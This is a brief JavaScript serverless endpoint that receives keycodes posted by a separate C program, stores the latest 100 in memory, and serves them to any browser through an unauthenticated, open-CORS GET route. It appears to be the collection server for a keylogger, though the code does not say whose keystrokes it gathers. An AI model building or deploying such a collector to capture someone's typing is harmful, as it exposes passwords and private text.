let keyLog = [];

export default async function handler(req, res) {
  // ✅ CORS headers
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  // ✅ Respond to preflight request
  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  // ✅ Handle POST from C program
  if (req.method === "POST") {
    try {
      const { keycode } = req.body;

      if (typeof keycode !== "number") {
        return res.status(400).json({ success: false, error: "Invalid keycode" });
      }

      keyLog.push(keycode);
      if (keyLog.length > 100) keyLog.shift();

      return res.status(200).json({ success: true });
    } catch (err) {
      return res.status(500).json({ success: false, error: "Internal server error" });
    }
  }

  // ✅ Handle GET from browser
  if (req.method === "GET") {
    return res.status(200).json(keyLog);
  }

  // ✅ Block other methods
  return res.status(405).end(`Method ${req.method} Not Allowed`);
}
